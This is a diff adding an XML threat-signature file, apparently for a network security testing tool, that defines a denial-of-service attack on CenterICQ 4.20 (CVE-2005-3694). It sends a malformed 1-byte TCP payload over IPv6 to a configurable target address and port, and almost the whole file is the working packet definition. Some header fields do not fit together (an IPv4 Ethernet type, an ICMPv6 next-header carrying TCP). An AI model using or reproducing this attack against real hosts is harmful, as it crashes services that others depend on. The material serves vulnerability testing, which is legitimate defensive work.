@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CenterICQ Malformed Packet Handling Remote Denial of Service Vulnerability (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat sends a malformed 1 byte tcp packet which causes an unhandled exception. CenterICQ uses any number of ports for file transfers, so any port specification works well. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Denial_of_Service"/>
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CenterICQ"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CenterICQ_CenterICQ"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="CenterICQ_CenterICQ_4.20"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="https://bugs.gentoo.org/show_bug.cgi?id=100519"/>
+    <CVEID display="true" value="CVE-2005-3694"/>
+    <bugtraqID display="true" value="15649"/>
+    <OSVDB display="true" value="21270"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="5c45e8cdcafeac1531640eb967e57f9a" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <Created value="1139461917" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="F"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$destPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="01" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+</threatSignature>
